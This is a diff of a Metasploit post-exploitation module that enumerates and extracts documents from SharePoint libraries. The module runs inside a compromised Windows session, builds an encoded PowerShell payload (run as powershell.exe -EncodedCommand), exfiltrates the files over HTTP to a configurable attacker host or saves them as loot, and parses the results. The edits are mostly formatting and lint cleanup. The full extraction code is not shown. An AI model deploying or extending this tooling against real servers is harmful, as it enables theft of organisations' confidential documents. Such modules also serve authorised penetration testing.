@@ -7,23 +7,31 @@ class MetasploitModule < Msf::Post::Windows::Powershell
   include Msf::Exploit::Powershell
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'SharePoint Document Library Enumerator and Extractor',
-      'Description'    => %q{
-        Enumerates and extracts documents from a specified SharePoint library using the
-        SharePoint .NET API. Designed to run in an existing Windows session (e.g., Meterpreter)
-        on a SharePoint server. Supports exfiltration via HTTP or Meterpreter channels,
-        with configurable filters for file size and library targeting. Requires execution
-        in a context with access to SharePoint assemblies and appropriate permissions.
-      },
-      'Author'         => ['Vikram Verma'],
-      'License'        => MSF_LICENSE,
-      'Platform'       => 'win',
-      'Arch'           => ARCH_X86,
-      'SessionTypes'   => ['meterpreter', 'shell'],
-      'References'     => [['URL', 'https://docs.microsoft.com/en-us/sharepoint/dev/']],
-      'Compat'         => { 'Meterpreter' => true }
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'SharePoint Document Library Enumerator and Extractor',
+        'Description' => %q{
+          Enumerates and extracts documents from a specified SharePoint library using the
+          SharePoint .NET API. Designed to run in an existing Windows session (e.g., Meterpreter)
+          on a SharePoint server. Supports exfiltration via HTTP or Meterpreter channels,
+          with configurable filters for file size and library targeting. Requires execution
+          in a context with access to SharePoint assemblies and appropriate permissions.
+        },
+        'Author' => ['Custom Contributor'],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X86,
+        'SessionTypes' => ['meterpreter', 'shell'],
+        'References' => [['URL', 'https://docs.microsoft.com/en-us/sharepoint/dev/']],
+        'Compat' => { 'Meterpreter' => true },
+        'Notes' => {
+          'Stability' => [STABILITY_CRASH_SAFE],
+          'Reliability' => [RELIABILITY_REPEATABLE_SESSION],
+          'SideEffects' => [SIDE_EFFECTS_NETWORK_TRAFFIC]
+        }
+      )
+    )
 
     register_options([
       OptString.new('SITE_URL', [true, 'Full URL of the SharePoint site', 'http://sharepoint.local']),
@@ -36,11 +44,11 @@ class MetasploitModule < Msf::Post::Windows::Powershell
   end
 
   def check
-    # Basic compatibility check
     if session.platform != 'windows'
-      return Exploit::CheckCode::Incompatible, 'Target is not a Windows system'
+      return [Exploit::CheckCode::Incompatible, 'Target is not a Windows system']
     end
-    Exploit::CheckCode::Appears, 'Module ready to run on Windows session'
+
+    [Exploit::CheckCode::Appears, 'Module ready to run on Windows session']
   end
 
   def run
@@ -49,7 +57,7 @@ class MetasploitModule < Msf::Post::Windows::Powershell
     end
 
     handle_exfiltration_config
-    print_status("Generating SharePoint document extractor payload...")
+    print_status('Generating SharePoint document extractor payload...')
     ps_script = build_ps_payload
     encoded_cmd = cmd_psh_payload(ps_script, 'x86', { encode: true })
 
@@ -59,7 +67,7 @@ class MetasploitModule < Msf::Post::Windows::Powershell
       process_output(output)
     else
       session.shell_write("powershell.exe -EncodedCommand #{encoded_cmd}\n")
-      print_status("Check session output manually for results.")
+      print_status('Check session output manually for results.')
     end
   end
 
@@ -129,8 +137,8 @@ class MetasploitModule < Msf::Post::Windows::Powershell
         Add-Type -TypeDefinition @"
         #{dotnet_code}
         "@ -ReferencedAssemblies "Microsoft.SharePoint.dll","System.Web.dll" -ErrorAction Stop
-        [SharePointExtractor]::ExtractDocs('#{datastore['SITE_URL']}', '#{datastore['LIBRARY']}', 
-          '#{datastore['EXFIL_METHOD']}', '#{datastore['EXFIL_HOST']}', #{datastore['EXFIL_PORT']}, 
+        [SharePointExtractor]::ExtractDocs('#{datastore['SITE_URL']}', '#{datastore['LIBRARY']}',#{' '}
+          '#{datastore['EXFIL_METHOD']}', '#{datastore['EXFIL_HOST']}', #{datastore['EXFIL_PORT']},#{' '}
           #{datastore['MAX_SIZE']})
       } catch {
         Write-Output "FATAL:AssemblyLoadError:" + $_.Exception.Message
@@ -154,20 +162,21 @@ class MetasploitModule < Msf::Post::Windows::Powershell
     output.split("\n").each do |line|
       case line
       when /^FILE:([^:]+):(.*)$/
-        file_name, b64_data = $1, $2
-        file_path = store_loot("sharepoint.document", "application/octet-stream", session, 
-                              Rex::Text.decode_base64(b64_data), file_name)
+        file_name = ::Regexp.last_match(1)
+        b64_data = ::Regexp.last_match(2)
+        file_path = store_loot('sharepoint.document', 'application/octet-stream', session,
+                               Rex::Text.decode_base64(b64_data), file_name)
         print_good("Saved #{file_name} to #{file_path}")
       when /^SUCCESS:HTTP:([^:]+):(\d+)$/
-        print_good("Exfiltrated #{$1} via HTTP (#{$2} bytes)")
+        print_good("Exfiltrated #{::Regexp.last_match(1)} via HTTP (#{::Regexp.last_match(2)} bytes)")
       when /^ERROR:(.+)$/
-        print_error("Error: #{$1}")
+        print_error("Error: #{::Regexp.last_match(1)}")
       when /^INFO:(.+)$/
-        print_status("Info: #{$1}")
+        print_status("Info: #{::Regexp.last_match(1)}")
       when /^SKIP:(.+)$/
-        print_warning("Skipped: #{$1}")
+        print_warning("Skipped: #{::Regexp.last_match(1)}")
       when /^FATAL:(.+)$/
-        fail_with(Failure::Unknown, "Fatal error: #{$1}")
+        fail_with(Failure::Unknown, "Fatal error: #{::Regexp.last_match(1)}")
       end
     end
   end
